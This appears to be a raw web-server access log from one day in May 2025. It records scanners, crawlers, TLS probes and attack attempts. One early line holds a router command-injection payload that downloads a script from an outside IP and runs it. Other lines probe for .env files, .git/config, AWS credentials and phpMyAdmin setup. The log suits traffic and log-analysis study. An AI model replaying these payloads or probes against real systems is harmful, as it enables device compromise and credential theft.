185.218.86.4 - - [09/May/2025:00:07:20 +0000] "GET / HTTP/1.1" 200 396 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
45.95.147.209 - - [09/May/2025:00:14:13 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60cd+%2Ftmp%3B+rm+-rf+sh%3B+wget+http%3A%2F%2F212.81.47.226%2Fsh%3B+chmod+777+sh%3B+.%2Fsh+tplink%3B+rm+-rf+sh%60) HTTP/1.1" 404 162 "-" "Go-http-client/1.1"
185.247.137.160 - - [09/May/2025:00:16:26 +0000] "GET / HTTP/1.1" 200 396 "-" "Mozilla/5.0 (compatible; InternetMeasurement/1.0; +https://internet-measurement.com/)"
154.81.156.7 - - [09/May/2025:00:22:13 +0000] "GET / HTTP/1.1" 200 612 "-" "-"
198.235.24.17 - - [09/May/2025:00:24:21 +0000] "GET / HTTP/1.1" 200 396 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
154.81.156.35 - - [09/May/2025:00:31:49 +0000] "GET / HTTP/1.1" 200 612 "-" "curl/7.81.0"
185.218.84.178 - - [09/May/2025:00:34:43 +0000] "GET / HTTP/1.1" 200 396 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
20.163.34.74 - - [09/May/2025:00:52:42 +0000] "GET / HTTP/1.1" 200 396 "-" "Mozilla/5.0 zgrab/0.x"
198.235.24.142 - - [09/May/2025:01:31:53 +0000] "GET / HTTP/1.0" 200 612 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
78.153.140.147 - - [09/May/2025:01:35:43 +0000] "GET /.env HTTP/1.1" 404 197 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.147 - - [09/May/2025:01:35:43 +0000] "POST / HTTP/1.1" 405 568 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
176.65.148.243 - - [09/May/2025:01:40:16 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 134 "http://20.255.50.20:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
176.65.148.243 - - [09/May/2025:01:40:16 +0000] "" 400 0 "-" "-"
45.84.143.10 - - [09/May/2025:01:55:42 +0000] "GET / HTTP/1.0" 200 612 "-" "curl/7.88.1"
202.5.37.203 - - [09/May/2025:01:57:15 +0000] "GET / HTTP/1.1" 200 612 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
176.65.148.243 - - [09/May/2025:02:30:34 +0000] "GET / HTTP/1.1" 200 396 "-" "Linux Gnu (cow)"
103.17.51.100 - - [09/May/2025:02:36:02 +0000] "GET / HTTP/1.1" 200 612 "-" "Hello-World/1.0"
103.17.51.100 - - [09/May/2025:02:36:02 +0000] "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" 400 166 "-" "-"
154.81.156.35 - - [09/May/2025:02:51:29 +0000] "GET / HTTP/1.1" 200 612 "-" "curl/7.81.0"
80.82.77.202 - - [09/May/2025:03:19:31 +0000] "GET / HTTP/1.0" 200 612 "-" "Mozilla/5.0 (Linux; Android 9; rv:75.0.3770.67) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.67 Mobile Safari/537.36"
185.218.86.4 - - [09/May/2025:03:20:47 +0000] "GET / HTTP/1.1" 200 396 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
93.174.93.12 - - [09/May/2025:03:32:45 +0000] "\x16\x03\x02\x01o\x01\x00\x01k\x03\x02RH\xC5\x1A#\xF7:N\xDF\xE2\xB4\x82/\xFF\x09T\x9F\xA7\xC4y\xB0h\xC6\x13\x8C\xA4\x1C=\x22\xE1\x1A\x98 \x84\xB4,\x85\xAFn\xE3Y\xBBbhl\xFF(=':\xA9\x82\xD9o\xC8\xA2\xD7\x93\x98\xB4\xEF\x80\xE5\xB9\x90\x00(\xC0" 400 166 "-" "-"
205.210.31.199 - - [09/May/2025:03:36:41 +0000] "GET / HTTP/1.0" 200 612 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
154.81.156.7 - - [09/May/2025:03:55:46 +0000] "GET / HTTP/1.1" 200 612 "-" "-"
152.53.248.175 - - [09/May/2025:04:01:48 +0000] "CONNECT www.google.com:443 HTTP/1.1" 400 166 "-" "-"
65.49.1.15 - - [09/May/2025:04:03:56 +0000] "GET / HTTP/1.1" 200 396 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
65.49.1.16 - - [09/May/2025:04:05:27 +0000] "GET /webui/ HTTP/1.1" 404 197 "-" "Mozilla/5.0 (X11; CrOS x86_64 14541.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36"
65.49.1.21 - - [09/May/2025:04:07:30 +0000] "GET /favicon.ico HTTP/1.1" 404 197 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
65.49.1.11 - - [09/May/2025:04:08:07 +0000] "GET /geoserver/web/ HTTP/1.1" 404 197 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
185.218.84.178 - - [09/May/2025:04:28:27 +0000] "GET / HTTP/1.1" 200 396 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
154.81.156.35 - - [09/May/2025:04:56:02 +0000] "GET / HTTP/1.1" 200 612 "-" "curl/7.81.0"
20.65.193.213 - - [09/May/2025:04:59:50 +0000] "GET /hudson HTTP/1.1" 404 134 "-" "Mozilla/5.0 zgrab/0.x"
154.81.156.7 - - [09/May/2025:05:06:39 +0000] "GET / HTTP/1.1" 200 612 "-" "-"
104.234.115.219 - - [09/May/2025:05:07:04 +0000] "GET / HTTP/1.0" 200 612 "-" "'Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; +https://www.nokia.com/genomecrawler)'"
195.211.191.76 - - [09/May/2025:05:08:07 +0000] "GET /.git/HEAD HTTP/1.1" 404 197 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36"
104.234.115.219 - - [09/May/2025:05:08:34 +0000] "\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\x5C\xC30\xA9F\xA2O\x9E\xCE6\xD1&;E\xD4\x95\xE1\xCD\xBB\xA1\xFA\xF8\xC9\xA8\xBB\x80\xD4\x18\x89]x\xE7 J4j\xFA\xB4\x1A\xA0\xA3iv k\x8A\x85\x02\xB2\x0F\xEF\xAB\xC8\x93\xC6.\xE5\x17u\xD1\xC0j\xE2\x81d\x00&\xCC\xA8\xCC\xA9\xC0/\xC00\xC0+\xC0,\xC0\x13\xC0\x09\xC0\x14\xC0" 400 166 "-" "-"
104.234.115.219 - - [09/May/2025:05:11:14 +0000] "GET / HTTP/1.1" 200 396 "-" "'Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; +https://www.nokia.com/genomecrawler)'"
43.157.38.228 - - [09/May/2025:05:12:16 +0000] "GET / HTTP/1.1" 200 396 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
112.185.162.84 - - [09/May/2025:05:13:41 +0000] "GET / HTTP/1.0" 200 612 "-" "curl/7.88.1"
188.166.191.108 - - [09/May/2025:05:26:00 +0000] "GET /.env HTTP/1.1" 404 134 "-" "Mozilla/5.0; Keydrop.io/1.0(onlyscans.com/about);"
188.166.191.108 - - [09/May/2025:05:26:01 +0000] "GET /.git/config HTTP/1.1" 404 134 "-" "Mozilla/5.0; Keydrop.io/1.0(onlyscans.com/about);"
205.210.31.226 - - [09/May/2025:05:54:46 +0000] "\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03y\xFA1\x95\x5C\xCDq\xD1\x11\xA9@\xA8_\xEB\xD0\x03k\xFE\x81\x1E\xC7v\x04\xDFY\xD9<\xD6\xE1\x9F_\x7F \xAEs``\x0E\x0F\xAE\xD5tex\xBC\xFE\xEF^\x11\xE52`\xE5\x83\x08\xAE\xCBo\xB1IQ\x92\x08%H\x00&\xC0+\xC0/\xC0,\xC00\xCC\xA9\xCC\xA8\xC0\x09\xC0\x13\xC0" 400 166 "-" "-"
205.210.31.226 - - [09/May/2025:05:54:46 +0000] "\x16\x03\x01\x00\xCA\x01\x00\x00\xC6\x03\x03\x9A\xBC\x9E:\x06\xD7\xCE\xA0\x22\x0F\x85^\x0F\xA5\xD6\xB6p\x88%\xDFY\x83\xC9$\xB5\x8B\x02\x5C\x81\x96\xB0\xF3\x00\x00h\xCC\x14\xCC\x13\xC0/\xC0+\xC00\xC0,\xC0\x11\xC0\x07\xC0'\xC0#\xC0\x13\xC0\x09\xC0(\xC0$\xC0\x14\xC0" 400 166 "-" "-"
185.218.86.4 - - [09/May/2025:06:16:54 +0000] "GET / HTTP/1.1" 200 396 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
68.69.186.226 - - [09/May/2025:06:24:44 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 134 "http://20.255.50.20:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
68.69.186.226 - - [09/May/2025:06:24:44 +0000] "" 400 0 "-" "-"
80.94.95.203 - - [09/May/2025:06:38:56 +0000] "\x03\x00\x00/*\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Administr" 400 166 "-" "-"
154.81.156.7 - - [09/May/2025:07:03:19 +0000] "GET / HTTP/1.1" 200 612 "-" "-"
20.65.201.33 - - [09/May/2025:07:10:54 +0000] "GET /manager/html HTTP/1.1" 404 134 "-" "Mozilla/5.0 zgrab/0.x"
159.253.120.209 - - [09/May/2025:07:18:00 +0000] "GET /phpmyadmin/scripts/setup.php HTTP/1.1" 404 162 "-" "Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows NT 5.1) Opera 7.01 [en]"
159.253.120.209 - - [09/May/2025:07:18:01 +0000] "POST /phpmyadmin/scripts/setup.php HTTP/1.1" 404 162 "http://20.255.50.20/phpmyadmin/scripts/setup.php" "Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows NT 5.1) Opera 7.01 [en]"
43.157.53.115 - - [09/May/2025:07:22:26 +0000] "GET / HTTP/1.1" 200 396 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
154.81.156.35 - - [09/May/2025:07:24:14 +0000] "GET / HTTP/1.1" 200 612 "-" "curl/7.81.0"
195.178.110.224 - - [09/May/2025:07:47:54 +0000] "GET / HTTP/1.1" 200 612 "-" "Hello World"
154.81.156.7 - - [09/May/2025:08:02:35 +0000] "GET / HTTP/1.1" 200 612 "-" "-"
180.254.116.14 - - [09/May/2025:08:06:22 +0000] "GET / HTTP/1.1" 200 612 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
185.218.84.178 - - [09/May/2025:08:09:00 +0000] "GET / HTTP/1.1" 200 396 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
74.82.47.5 - - [09/May/2025:08:17:39 +0000] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03w)S\x87\xA8\xB4F%U,e\xA40\x9E}T\x9B\xFA\xF7\xB6p\x81\xB3\xBA^j\xE7\xD8!j\xB7\xCC\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 166 "-" "-"
109.74.196.231 - - [09/May/2025:08:35:43 +0000] "GET / HTTP/1.1" 200 396 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:8.0) Gecko/20100101 Firefox/8.0"
109.74.196.231 - - [09/May/2025:08:35:43 +0000] "\x16\x03\x01\x00\xFC\x01\x00\x00\xF8\x03\x03\xD8\x95\xCCF\x01\xA2\xAF\xEA\xC0\x09D\x17\xAC\xD6S\xF4[CRNm3H.`\xA5;%64.\x83 \xD5Z\xBC\x8A=\xE6\xF3\x01\xD4\x0Bx\xCA\xAD\x80\x9Bp\xAA\xF3M]+1\xCE\x03\x96a\xC3\xA9\xD24\xBD\x1D\x00$\x13\x02\x13\x03\x13\x01\xC0,\xC00\xC0+\xC0/\xCC\xA9\xCC\xA8\xC0$\xC0(\xC0#\xC0'\x00\x9F\x00\x9E\x00k\x00g\x00\xFF\x01\x00\x00\x8B\x00\x0B\x00\x04\x03\x00\x01\x02\x00" 400 166 "-" "-"
109.74.196.231 - - [09/May/2025:08:35:44 +0000] "\x16\x03\x01\x00\xFC\x01\x00\x00\xF8\x03\x036\xDCUX*\x9D~\x93!f\x980\xBB1\x85_\x9Asy\x88\x15\xB2\x98\xD0\x91\x115Y\xE0\x1F<\xCA \xF7\x14u\xF5\xA5\xF1\xDCq\xEA_\xBD\xC8I\xA4z\x03\xA37A\xF7\xC8\xB6\x1D\xCFe\x81\x08s\x0E\x1B{G\x00$\x13\x02\x13\x03\x13\x01\xC0,\xC00\xC0+\xC0/\xCC\xA9\xCC\xA8\xC0$\xC0(\xC0#\xC0'\x00\x9F\x00\x9E\x00k\x00g\x00\xFF\x01\x00\x00\x8B\x00\x0B\x00\x04\x03\x00\x01\x02\x00" 400 166 "-" "-"
109.74.196.231 - - [09/May/2025:08:35:44 +0000] "\x16\x03\x01\x00\xFC\x01\x00\x00\xF8\x03\x03\x9E/\xDDW\xE6;$f\x0B\xC5\x1Eq\xDEJ\x14\xC9\x9C\x8C1\xEBP\x93!\xD3\x1F\xA0\x97\xF5!e~< \xEA\xE8543\x85Q\xBF\xFE|3\x8B}\xDEx\x85\x95sx\xD4_\xB68{\x81U\xF8\x85W\x1B$t\x00$\x13\x02\x13\x03\x13\x01\xC0,\xC00\xC0+\xC0/\xCC\xA9\xCC\xA8\xC0$\xC0(\xC0#\xC0'\x00\x9F\x00\x9E\x00k\x00g\x00\xFF\x01\x00\x00\x8B\x00\x0B\x00\x04\x03\x00\x01\x02\x00" 400 166 "-" "-"
185.218.86.4 - - [09/May/2025:08:42:16 +0000] "GET / HTTP/1.1" 200 396 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
205.210.31.146 - - [09/May/2025:08:46:23 +0000] "\x16\x03\x01\x00\xCA\x01\x00\x00\xC6\x03\x03\xDF\xA0\xD5\x93U\x1B\xCE\x9EW1\xE6\x91\xFC\xA6\xDEfw\xA9\xB0r]h\x9Cg" 400 166 "-" "-"
205.210.31.146 - - [09/May/2025:08:46:23 +0000] "\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\x99\xA7}\x8A\x13\x0F\xE1\x97\xAF\x22V\xC1\x22y\xEF\xC3\xE3,.\x94\x80\xEBt\xDE\xBC\x1E\xDC" 400 166 "-" "-"
20.29.23.198 - - [09/May/2025:09:04:28 +0000] "MGLNDD_20.255.50.20_80" 400 166 "-" "-"
115.65.169.36 - - [09/May/2025:09:06:19 +0000] "GET / HTTP/1.0" 200 612 "-" "curl/7.88.1"
196.251.86.175 - - [09/May/2025:09:16:09 +0000] "GET /.env HTTP/1.1" 404 197 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3724.8 Safari/537.36"
79.7.229.172 - - [09/May/2025:09:19:26 +0000] "GET / HTTP/1.0" 200 612 "-" "-"
206.168.34.195 - - [09/May/2025:09:22:26 +0000] "GET / HTTP/1.1" 200 396 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
206.168.34.195 - - [09/May/2025:09:22:37 +0000] "GET /favicon.ico HTTP/1.1" 404 134 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
206.168.34.195 - - [09/May/2025:09:22:42 +0000] "PRI * HTTP/2.0" 400 166 "-" "-"
206.168.34.195 - - [09/May/2025:09:22:52 +0000] "GET /favicon.ico HTTP/1.1" 404 134 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
206.168.34.195 - - [09/May/2025:09:22:56 +0000] "\x16\x03\x01\x00\xF7\x01\x00\x00\xF3\x03\x03\xFC\x5C\x82\x9B\x1E\xF7\xC5\x7F\x84\xD1x^\xFFn\x0E\x0B\x96c\xE9\x07\x94\x933_^\x19\xE6W4?~\xA6 \xDBq\x1F\xE2\xB2\xFDP\xAC\xB9\x87\xC1\xAE2\xE9fy&" 400 166 "-" "-"
154.81.156.35 - - [09/May/2025:09:32:55 +0000] "GET / HTTP/1.1" 200 612 "-" "curl/7.81.0"
80.82.77.202 - - [09/May/2025:10:25:59 +0000] "\x16\x03\x02\x01o\x01\x00\x01k\x03\x02RH\xC5\x1A#\xF7:N\xDF\xE2\xB4\x82/\xFF\x09T\x9F\xA7\xC4y\xB0h\xC6\x13\x8C\xA4\x1C=\x22\xE1\x1A\x98 \x84\xB4,\x85\xAFn\xE3Y\xBBbhl\xFF(=':\xA9\x82\xD9o\xC8\xA2\xD7\x93\x98\xB4\xEF\x80\xE5\xB9\x90\x00(\xC0" 400 166 "-" "-"
185.242.226.115 - - [09/May/2025:10:34:06 +0000] "\x16\x03\x01\x00\x8A\x01\x00\x00\x86\x03\x03\xD2wB]\x5CV\xF0\xBD\xEDF\xBA:\xA1\xB5\xD4t3\x87\x1C\xBC\xB6D\xA9\x8DE\x1Ei\xAD\xF0\x91\xD0^\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 166 "-" "-"
4.227.178.199 - - [09/May/2025:10:34:28 +0000] "GET /developmentserver/metadatauploader HTTP/1.1" 404 134 "-" "Mozilla/5.0 zgrab/0.x"
45.135.194.53 - - [09/May/2025:10:34:57 +0000] "GET / HTTP/1.1" 200 612 "-" "-"
121.179.77.196 - - [09/May/2025:10:52:24 +0000] "GET / HTTP/1.0" 200 612 "-" "curl/7.88.1"
185.218.84.178 - - [09/May/2025:11:04:03 +0000] "GET / HTTP/1.1" 200 396 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
154.81.156.7 - - [09/May/2025:11:08:19 +0000] "GET / HTTP/1.1" 200 612 "-" "-"
43.129.58.235 - - [09/May/2025:11:41:46 +0000] "GET / HTTP/1.1" 200 396 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
45.79.181.179 - - [09/May/2025:11:46:59 +0000] "\x16\x03\x01\x01" 400 166 "-" "-"
45.79.181.179 - - [09/May/2025:11:47:00 +0000] "\x16\x03\x01\x01" 400 166 "-" "-"
185.218.86.4 - - [09/May/2025:12:01:16 +0000] "GET / HTTP/1.1" 200 396 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
154.81.156.35 - - [09/May/2025:12:06:02 +0000] "GET / HTTP/1.1" 200 612 "-" "curl/7.81.0"
154.81.156.7 - - [09/May/2025:12:14:00 +0000] "GET / HTTP/1.1" 200 612 "-" "-"
159.253.120.209 - - [09/May/2025:12:38:29 +0000] "GET /phpmyadmin/scripts/setup.php HTTP/1.1" 404 162 "-" "Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows NT 5.1) Opera 7.01 [en]"
159.253.120.209 - - [09/May/2025:12:38:29 +0000] "POST /phpmyadmin/scripts/setup.php HTTP/1.1" 404 162 "http://20.255.50.20/phpmyadmin/scripts/setup.php" "Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows NT 5.1) Opera 7.01 [en]"
122.173.31.204 - - [09/May/2025:13:04:36 +0000] "GET / HTTP/1.1" 200 51 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
122.173.31.204 - - [09/May/2025:13:04:37 +0000] "GET /favicon.ico HTTP/1.1" 404 184 "http://ai-log-analyser.eastasia.cloudapp.azure.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
122.173.31.204 - - [09/May/2025:13:04:40 +0000] "GET / HTTP/1.1" 200 51 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
122.173.31.204 - - [09/May/2025:13:07:09 +0000] "GET / HTTP/1.1" 200 51 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
122.173.31.204 - - [09/May/2025:13:07:10 +0000] "GET / HTTP/1.1" 200 51 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
122.173.31.204 - - [09/May/2025:13:13:42 +0000] "GET / HTTP/1.1" 200 51 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
122.173.31.204 - - [09/May/2025:13:13:43 +0000] "GET / HTTP/1.1" 200 51 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
122.173.31.204 - - [09/May/2025:13:13:44 +0000] "GET / HTTP/1.1" 200 51 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
122.173.31.204 - - [09/May/2025:13:13:46 +0000] "GET / HTTP/1.1" 200 51 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
122.173.31.204 - - [09/May/2025:13:13:47 +0000] "GET / HTTP/1.1" 200 51 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
45.156.131.25 - - [09/May/2025:13:21:05 +0000] "GET / HTTP/1.1" 200 396 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
45.156.131.24 - - [09/May/2025:13:21:05 +0000] "GET /favicon.ico HTTP/1.1" 404 197 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
59.91.40.196 - - [09/May/2025:13:37:17 +0000] "GET / HTTP/1.1" 200 612 "-" "Hello-World/1.0"
59.91.40.196 - - [09/May/2025:13:37:17 +0000] "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" 400 166 "-" "-"
154.81.156.7 - - [09/May/2025:13:43:34 +0000] "GET / HTTP/1.1" 200 612 "-" "-"
185.218.84.178 - - [09/May/2025:13:43:59 +0000] "GET / HTTP/1.1" 200 396 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
43.130.139.136 - - [09/May/2025:13:47:07 +0000] "GET / HTTP/1.1" 200 396 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
179.43.152.115 - - [09/May/2025:14:11:12 +0000] "\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03e\xA1`~7\x17\xC6\xFBLI\x0E\x82\x9Ah\x89\xE0\x1Bh\xD1\x16\xCE\xF6m\xA0:\xAF\x222B\x0B\xB7\xC9 %\x94\x84{\xDB\x09\xB9\xC6\xC7r:\xC7\xEA?\xD5" 400 166 "-" "-"
179.43.152.115 - - [09/May/2025:14:11:12 +0000] "GET / HTTP/1.1" 400 166 "-" "-"
179.43.152.115 - - [09/May/2025:14:11:12 +0000] "GET / HTTP/1.1" 200 612 "-" "l9tcpid/v1.1.0"
179.43.152.115 - - [09/May/2025:14:11:13 +0000] "GET /.env.local HTTP/1.1" 404 134 "-" "l9explore/1.2.2"
179.43.152.115 - - [09/May/2025:14:11:13 +0000] "GET /data/.git/config HTTP/1.1" 404 134 "-" "l9explore/1.2.2"
179.43.152.115 - - [09/May/2025:14:11:13 +0000] "GET /admin/.git/config HTTP/1.1" 404 134 "-" "l9explore/1.2.2"
179.43.152.115 - - [09/May/2025:14:11:14 +0000] "GET /.env.prod.local HTTP/1.1" 404 134 "-" "l9explore/1.2.2"
179.43.152.115 - - [09/May/2025:14:11:14 +0000] "GET /.envrc HTTP/1.1" 404 134 "-" "l9explore/1.2.2"
179.43.152.115 - - [09/May/2025:14:11:14 +0000] "GET /config/.env HTTP/1.1" 404 134 "-" "l9explore/1.2.2"
179.43.152.115 - - [09/May/2025:14:11:15 +0000] "GET /cms/.git/config HTTP/1.1" 404 134 "-" "l9explore/1.2.2"
179.43.152.115 - - [09/May/2025:14:11:15 +0000] "GET /.aws/credentials HTTP/1.1" 404 134 "-" "l9explore/1.2.2"
179.43.152.115 - - [09/May/2025:14:11:15 +0000] "GET /.env HTTP/1.1" 404 134 "-" "l9explore/1.2.2"
179.43.152.115 - - [09/May/2025:14:11:16 +0000] "GET /.env.config HTTP/1.1" 404 134 "-" "l9explore/1.2.2"
179.43.152.115 - - [09/May/2025:14:11:16 +0000] "GET /.env.preprod HTTP/1.1" 404 134 "-" "l9explore/1.2.2"
